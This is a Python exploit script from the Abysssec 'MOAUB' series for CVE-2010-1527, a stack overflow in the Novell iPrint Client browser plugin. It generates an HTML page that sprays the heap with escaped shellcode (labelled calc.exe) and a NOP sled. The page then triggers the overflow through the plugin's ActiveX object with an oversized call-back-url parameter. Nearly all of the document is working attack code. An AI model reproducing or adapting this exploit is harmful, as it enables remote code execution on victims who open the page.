'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 


  Title            : Novell iPrint Client Browser Plugin call-back-url stack overflow
  Version          : iPrint Client plugin v5.42 (XP SP3)
  Analysis         : http://www.abysssec.com
  Vendor           : http://www.novell.com
  Impact           : Critical
  Contact          : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter          : @abysssec
  CVE              : CVE-2010-1527

http://www.exploit-db.com/moaub-19-novell-iprint-client-browser-plugin-call-back-url-stack-overflow/

'''

import sys;
#calc.exe shellcode
temp = """<script>
     
	 shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+ 
                    '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+ 
                    '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+ 
                    '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+ 
                    '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+ 
                    '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+ 
                    '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+ 
                    '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e'); 
                      
     nops=unescape('%u9090%u9090'); 
     headersize =20; 
     slackspace= headersize + shellcode.length; 
     while(nops.length< slackspace) nops+= nops; 
     fillblock= nops.substring(0, slackspace); 
     block= nops.substring(0, nops.length- slackspace); 
     while( block.length+ slackspace<0x50000) block= block+ block+ fillblock; 
     memory=new Array(); 
     for( counter=0; counter<200; counter++) memory[counter]= block + shellcode;     
</script>
<object ID='target' classid='clsid:36723f97-7aa0-11d4-8919-ff2d71d0d32c'>
<param name='operation' value='op-client-interface-version' />
<param name='result-type' value='url' />
<param name='call-back-url' value='

"""
i=0
while(i<1000):
    temp = temp + "\x0a";
    i=i+1

temp = temp + """' />
</object>
"""

htmlFile = open("call-back-url.html","w")
htmlFile.write(temp)
htmlFile.close()